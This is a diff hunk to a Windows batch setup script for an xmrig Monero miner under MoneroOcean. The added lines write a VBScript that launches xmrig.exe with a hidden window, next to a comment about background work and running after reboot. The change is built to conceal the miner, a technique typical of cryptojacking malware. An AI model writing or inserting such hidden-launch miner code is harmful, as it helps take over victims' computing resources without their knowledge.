@@ -256,7 +256,12 @@ echo echo Monero miner is already running in the background. Refusing to run ano
 echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
 echo :EXIT
 ) > "%USERPROFILE%\moneroocean\miner.bat"
-
+(
+echo Set oShell = CreateObject ("Wscript.Shell"^) 
+echo Dim strArgs
+echo strArgs = "xmrig.exe"
+echo oShell.Run strArgs, 0, false
+) >> %userprofile%/moneroocean/file.vbs
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
